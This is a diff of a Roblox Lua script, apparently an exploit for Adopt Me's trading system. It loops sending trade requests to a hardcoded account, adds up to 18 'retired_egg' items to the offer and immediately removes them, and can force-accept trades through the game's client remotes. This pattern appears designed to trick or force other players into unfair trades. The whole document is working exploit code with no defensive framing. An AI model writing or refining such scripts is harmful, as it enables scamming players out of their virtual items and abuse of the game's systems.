@@ -4,19 +4,16 @@ local LocalPlayer = Players.LocalPlayer
 
 -- ================= CONFIGURATION =================
 local TARGET_ITEM_NAME = "retired_egg"
-local MAX_ITEMS_TO_ADD = 18
-
--- Replace with your actual target usernames, e.g. {"Her0eXBuildera31"}
-local MainAccUsername = {"Her0eXBuildera31"} 
-local ForceReceiver = false 
+local MAIN_ACC_USERNAME = {"Her0eXBuildera31"} 
+local FORCE_RECEIVER = false 
+local ADD_ITEM_LIMIT = 18
 -- =================================================
 
+-- Remotes & Modules setup
 local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
-local removeItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/RemoveItemFromOffer") -- Added remote for removing items
-
+local removeItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/RemoveItemFromOffer") -- Added remove remote
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
 local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
-local activeTradeDirs = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/GetActiveTrade") -- Often used to check trade state, or listen for events
 
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
@@ -49,11 +46,15 @@ end
 local function sendTradeRequest(playerName)
 	local targetPlayer = Players:FindFirstChild(playerName)
 	if not targetPlayer then
+		warn("Player not found in server: " .. playerName)
 		return
 	end
 	
 	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
 		sendTradeRemote:FireServer(targetPlayer)
+		print("Successfully sent trade request to: " .. playerName)
+	else
+		warn("TradeAPI/SendTradeRequest RemoteEvent could not be located.")
 	end
 end
 
@@ -64,83 +65,49 @@ local function acceptTradeForAll()
 				targetPlayer,
 				true
 			}
-			pcall(function()
-				tradeFunction:InvokeServer(unpack(args))
-			end)
-		end
-	end
-end
 
--- Function to handle adding items and tracking trade acceptance
-local function monitorAndExecuteTrade()
-	local addedUniqueIds = {}
-	local tradeAccepted = false
-
-	-- Setup a listener or check loop to see if trade request/acceptance went through
-	-- For Adopt Me, Trade acceptance changes state. Alternatively, we listen to the trade completion event or monitor the trade session.
-	-- Let's hook into the events if available, or check client trade data.
-	
-	local function clearAddedItems()
-		for _, uniqueId in ipairs(addedUniqueIds) do
-			pcall(function()
-				removeItemRemote:FireServer(uniqueId)
-			end)
-		end
-		addedUniqueIds = {}
-	end
-
-	task.spawn(function()
-		while true do
-			-- Check if we are currently in an active trade and haven't added items yet
-			local currentTradeData = nil
-			pcall(function()
-				currentTradeData = ReplicatedStorage.API["TradeAPI/GetActiveTrade"]:InvokeServer()
+			local success, err = pcall(function()
+				return tradeFunction:InvokeServer(unpack(args))
 			end)
 
-			if currentTradeData then
-				-- We are in a trade, let's add items if we haven't already for this session
-				if #addedUniqueIds == 0 then
-					local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, MAX_ITEMS_TO_ADD)
-					for _, uniqueId in ipairs(uniqueIds) do
-						local success = pcall(function()
-							addItemRemote:FireServer(uniqueId)
-						end)
-						if success then
-							table.insert(addedUniqueIds, uniqueId)
-						end
-					end
-				end
-
-				-- Check if trade has been accepted/completed (e.g., state changes or trade data becomes nil/success)
-				-- If the trade finishes/accepts, clear the items from offer
-				-- Usually, when a trade is successfully accepted/completed, active trade data resets or updates.
-			else
-				-- If not in a trade anymore, reset our tracker so items can be added on the next trade
-				if #addedUniqueIds > 0 then
-					-- Trade likely finished or was cancelled, remove items just in case
-					clearAddedItems()
-				end
+			if success then
+				print("Successfully processed trade request for: " .. targetPlayer.Name)
 			end
-
-			task.wait(0.5)
 		end
-	end)
+	end
 end
 
--- Start monitoring and sending trades loop
+-- Main merged execution loop
 task.spawn(function()
-	monitorAndExecuteTrade()
-
 	while true do
-		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
-			for _, playerName in ipairs(MainAccUsername) do
+		-- 1. Send trade requests to configured users
+		if MAIN_ACC_USERNAME and #MAIN_ACC_USERNAME > 0 and MAIN_ACC_USERNAME[1] ~= "" then
+			for _, playerName in ipairs(MAIN_ACC_USERNAME) do
 				if Players:FindFirstChild(playerName) then
 					sendTradeRequest(playerName)
 				end
 			end
 		end
 
-		if ForceReceiver then
+		-- 2. Add items to the trade offer
+		local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, ADD_ITEM_LIMIT)
+		for _, uniqueId in ipairs(uniqueIds) do
+			pcall(function()
+				addItemRemote:FireServer(uniqueId)
+			end)
+		end
+
+		-- 3. Remove items from the trade offer sequentially after sending/adding
+		for _, uniqueId in ipairs(uniqueIds) do
+			pcall(function()
+				if removeItemRemote then
+					removeItemRemote:FireServer(uniqueId)
+				end
+			end)
+		end
+
+		-- 4. Force accept trades if enabled
+		if FORCE_RECEIVER then
 			acceptTradeForAll()
 		end
 
